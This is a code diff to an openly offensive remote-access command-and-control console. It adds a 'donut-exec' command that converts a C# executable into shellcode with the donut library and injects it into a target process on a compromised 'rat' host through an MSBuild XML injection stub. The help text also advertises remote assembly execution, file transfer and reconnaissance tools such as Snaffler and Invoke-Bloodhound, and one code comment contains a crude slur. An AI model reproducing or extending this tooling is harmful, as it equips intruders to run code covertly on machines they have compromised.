@@ -69,7 +69,7 @@ links = {}
 # Tab completion stuff -- https://stackoverflow.com/questions/5637124/tab-completion-in-pythons-raw-input
 class Completer(object):
     def __init__(self):
-        self.tab_cmds = ['all', 'rats', 'download', 'upload', 'psh', 'csharp', 'spawn', 'quit', 'back', 'exit', 'help', 'remove', 'clear', 'stagers', "shellcode", "eval", "note", "set-msbuild-path", "set-shellcode-process", "link", "unlink", "exec"]
+        self.tab_cmds = ['all', 'rats', 'download', 'upload', 'psh', 'csharp', 'spawn', 'quit', 'back', 'exit', 'help', 'remove', 'clear', 'stagers', "shellcode", "donut-exec", "eval", "note", "set-msbuild-path", "set-shellcode-process", "link", "unlink", "exec"]
         self.re_space = re.compile('.*\s+$', re.M)
 
     def add_tab_item(self, item):
@@ -424,10 +424,30 @@ def send_invoke_assembly(input_data):
     b64data = base64.b64encode(invoke_assembly_data.encode('utf-8')).decode('utf-8')
     return(b64data)
 
-def send_shellcode_msbuild_xml(input_data, ratID):
+def donut_exec(inp, ratID):
+    import donut # You must 'pip3 install donut-shellcode' to use this feature
+
+    import warnings
+    warnings.filterwarnings("ignore", category=DeprecationWarning) # Oh God I'm so sorry
+    # Ignore the "DeprecationWarning: PY_SSIZE_T_CLEAN will be required for '#' formats" warning
+
+    if(inp.split(" ")[1].isdigit() or inp.split(" ")[1] == "local"):
+        if(len(inp.split(" ")) >= 4): # donut-exec <pid> <donut_path> <donut_args ...>
+            shellcode = donut.create(file=inp.split(" ")[2], params=" ".join(inp.split(" ")[3:]))
+        else:
+            shellcode = donut.create(file=inp.split(" ")[2])
+    else:
+        if(len(inp.split(" ")) >= 3): # donut-exec <donut_path> <donut_args ...>
+            shellcode = donut.create(file=inp.split(" ")[1], params=" ".join(inp.split(" ")[2:]))
+        else:
+            shellcode = donut.create(file=inp.split(" ")[1])
+        
+    return(send_shellcode_msbuild_xml(inp, ratID, shellcode_data=shellcode))
+
+def send_shellcode_msbuild_xml(input_data, ratID, shellcode_data=None):
     arg1 = input_data.split(" ")[1]
     pid = "0";
-    if(arg1.isdigit()): # if your shellcode path name is a number you're retarded
+    if(arg1.isdigit()): # if your shellcode path name is a number you're retarded and that's your own fault
         pid = arg1
         shellcode_path = input_data.split(" ")[2]
         shellcode_template = "shellcode_injectproc.xml"
@@ -442,8 +462,9 @@ def send_shellcode_msbuild_xml(input_data, ratID):
     with open(os.getcwd() + "/resources/" + shellcode_template, "r") as fd:
         msbuild_data = fd.read()
 
-    with open(Path(shellcode_path).resolve() , "rb") as fd:
-        shellcode_data = fd.read()
+    if(shellcode_data == None):
+        with open(Path(shellcode_path).resolve() , "rb") as fd:
+            shellcode_data = fd.read()
 
     msbuild_data = msbuild_data.replace("~~KEY~~",  ratID)
     msbuild_data = msbuild_data.replace("~~PROCESSPATH~~",  shellcode_process)
@@ -771,6 +792,7 @@ def get_help():
     pretty_print("csharp <local_c_sharp_exe_path> <command_arguments> -- Runs the assembly on the remote host using MSBuild.exe and a C Sharp reflective loader stub")
     pretty_print("example: csharp scripts/Snaffler.exe --domain borgar.local --stdout")
     pretty_print("shellcode [pid|local] <local_shellcode.bin_path> -- Runs the specified shellcode in the specified PID (or the local process) or create a new process (using the process set with set-shellcode-process) using MSBuild.exe and a C Sharp injection stub")
+    pretty_print("donut-exec [pid|local] <C# executable> [arguments] -- Generates a donut shellcode and injects it in the specified PID (or the local process) or create a new process (using the process set with set-shellcode-process) using MSBuild.exe and a C Sharp injection stub")
     pretty_print("upload -- Uploads file from C2 server to rat host")
     pretty_print("example: upload scripts/Invoke-Bloodhound.ps1 C:\\users\\localadmin\\desktop\\ibh.ps1")
     pretty_print("download -- downloads the specified file from the rat host")
@@ -957,6 +979,16 @@ if __name__ == "__main__":
                                 pretty_print("[!] Could not open file " + colors(filepath) + " for reading or other unexpected error occured")
                                 print(e.message)
                                 continue
+
+                        elif(str.startswith(inp, "donut-exec ")):
+                            if(types[ratID] == "ps1"):
+                                pretty_print("[!] Feature is unsupported for PS1 rats, sorry")
+                                continue
+                            elif(types[ratID] == "c#"):
+                                pretty_print("[!] Feature is unsupported for C# rats, sorry")
+                                continue
+                            else:
+                                inp = "shc " + msbuild_path + " " + donut_exec(inp, ratID)
 
                         elif(str.startswith(inp, "eval ")):
                             try:
